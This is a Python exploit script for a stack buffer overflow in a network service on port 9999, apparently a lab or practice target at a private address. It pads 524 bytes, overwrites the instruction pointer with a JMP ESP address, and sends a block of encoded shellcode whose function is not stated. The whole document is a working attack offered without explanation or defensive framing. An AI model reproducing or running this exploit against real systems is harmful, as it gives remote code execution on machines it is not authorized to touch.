#!/usr/bin/env python3

import socket
from struct import pack

offset = 524
before_eip = b"A" * offset
eip = pack("<I", 0x311712f3) # JMP ESP

shellcode = (b"\xbd\xad\x19\x53\xa0\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9"
b"\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\xc5\x17\xb1\x55\xe9"
b"\xc0\xb7\x96\x11\x11\xd8\x1f\xf4\x20\xd8\x44\x7d\x12\xe8"
b"\x0f\xd3\x9f\x83\x42\xc7\x14\xe1\x4a\xe8\x9d\x4c\xad\xc7"
b"\x1e\xfc\x8d\x46\x9d\xff\xc1\xa8\x9c\xcf\x17\xa9\xd9\x32"
b"\xd5\xfb\xb2\x39\x48\xeb\xb7\x74\x51\x80\x84\x99\xd1\x75"
b"\x5c\x9b\xf0\x28\xd6\xc2\xd2\xcb\x3b\x7f\x5b\xd3\x58\xba"
b"\x15\x68\xaa\x30\xa4\xb8\xe2\xb9\x0b\x85\xca\x4b\x55\xc2"
b"\xed\xb3\x20\x3a\x0e\x49\x33\xf9\x6c\x95\xb6\x19\xd6\x5e"
b"\x60\xc5\xe6\xb3\xf7\x8e\xe5\x78\x73\xc8\xe9\x7f\x50\x63"
b"\x15\x0b\x57\xa3\x9f\x4f\x7c\x67\xfb\x14\x1d\x3e\xa1\xfb"
b"\x22\x20\x0a\xa3\x86\x2b\xa7\xb0\xba\x76\xa0\x75\xf7\x88"
b"\x30\x12\x80\xfb\x02\xbd\x3a\x93\x2e\x36\xe5\x64\x50\x6d"
b"\x51\xfa\xaf\x8e\xa2\xd3\x6b\xda\xf2\x4b\x5d\x63\x99\x8b"
b"\x62\xb6\x0e\xdb\xcc\x69\xef\x8b\xac\xd9\x87\xc1\x22\x05"
b"\xb7\xea\xe8\x2e\x52\x11\x7b\x91\x0b\x19\x74\x79\x4e\x19"
b"\x8b\xc2\xc7\xff\xe1\x24\x8e\xa8\x9d\xdd\x8b\x22\x3f\x21"
b"\x06\x4f\x7f\xa9\xa5\xb0\xce\x5a\xc3\xa2\xa7\xaa\x9e\x98"
b"\x6e\xb4\x34\xb4\xed\x27\xd3\x44\x7b\x54\x4c\x13\x2c\xaa"
b"\x85\xf1\xc0\x95\x3f\xe7\x18\x43\x07\xa3\xc6\xb0\x86\x2a"
b"\x8a\x8d\xac\x3c\x52\x0d\xe9\x68\x0a\x58\xa7\xc6\xec\x32"
b"\x09\xb0\xa6\xe9\xc3\x54\x3e\xc2\xd3\x22\x3f\x0f\xa2\xca"
b"\x8e\xe6\xf3\xf5\x3f\x6f\xf4\x8e\x5d\x0f\xfb\x45\xe6\x2f"
b"\x1e\x4f\x13\xd8\x87\x1a\x9e\x85\x37\xf1\xdd\xb3\xbb\xf3"
b"\x9d\x47\xa3\x76\x9b\x0c\x63\x6b\xd1\x1d\x06\x8b\x46\x1d"
b"\x03")

payload = before_eip + eip + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.28", 9999))
s.send(payload)
s.close()
